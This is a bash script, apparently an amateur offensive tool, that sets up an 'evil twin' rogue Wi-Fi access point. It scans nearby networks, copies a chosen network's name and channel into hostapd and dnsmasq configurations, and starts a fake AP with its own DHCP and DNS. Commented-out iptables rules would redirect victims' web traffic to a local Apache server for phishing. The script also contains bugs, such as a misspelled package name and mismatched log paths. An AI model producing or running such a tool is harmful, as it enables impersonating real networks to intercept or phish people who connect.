#!/bin/bash

#WARNING !!! Don't forget to active you wifi card on you VM !!
#airmon-ng stop wlan0mon &>> /dev/null
#-----------Variables----------------------#
INTERFACE=$(ifconfig |grep wl |cut -d ":" -f1)

#-----------Log Files----------------------#
touch /tmp/log.txt
LOG_FILE=/tmp/log.txt
touch /tmp/LOG_HOSTAPD.txt
LOG_HOSTAPD=/tmp/LOG_HOSTAPD.TXT
touch /tmp/LOG_DNS.txt
LOG_DNS=/tmp/LOG_DNS.txt

#-----------Service to install-------------#
apt update -y &>> /dev/null
apt install hostpad dnsmasq apache2 -y  &>> /dev/null

#-----------Interface in monitor mode------#
echo "My wifi interface are -->"$INTERFACE
airmon-ng start $INTERFACE &>> $LOG_FILE
airmon-ng check kill &>> /dev/null

MONITOR=$(ifconfig |grep mon |cut -d ":" -f1)

echo "Wifi card is now on monitor mode -->"$MONITOR
sleep 2;
#-----------Spoof---------------------------#
airodump-ng $MONITOR

echo "Choose the BSSID of the network to copy :"
read BSSID
echo "Enter the ESSID of the network :"
read ESSID
echo "Also the channel :"
read CHANNEL

echo "Your choose the network :"$ESSID","$BSSID","$CHANNEL "nice choice"

#-----------Hostapd Configuration-----------#
mkdir /root/fakeap/

touch hostapd.conf
echo "
interface=$MONITOR
driver=nl80211
ssid=$ESSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/fakeap/hostapd.conf
#--------------------------------------------#
#-----------Dnsmasq Configuration------------#
touch dnsmasq.conf
echo "
interface=$MONITOR
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
" > /root/fakeap/dnsmasq.conf
#---------------------------------------------#
ifconfig wlan0mon up 10.0.0.1 netmask 255.255.255.0
#route add -net 10.0.0.1 netmask 255.255.255.0 gw 10.0.0.1 
killall network-manager dnsmasq wpa_supplicant dhcpd &>> /dev/null #Kill process

echo "Now we have can start the access point"

#--------Access Point ------------------------#
echo "Access Point Starting..."
hostapd /root/fakeap/hostapd.conf &>> $LOG_HOSTAPD

echo "DHCP and DNS Server started tho"
dnsmasq -C /root/fakeap/dnsmasq.conf -d &>> $LOG_DNS

#------------------------------------------------------------------------------------------------------#

#Ces 4 directives permettent de supprimer les régles existantes
#iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

#iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
#iptables --append FORWARD --in-interface wlan0mon -j ACCEPT

#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 #Permet de redirige le trafic vers l'@ ip du router

#----On active la redirection de trafic-----#
#echo 1 > /proc/sys/net/ipv4/ip_forward
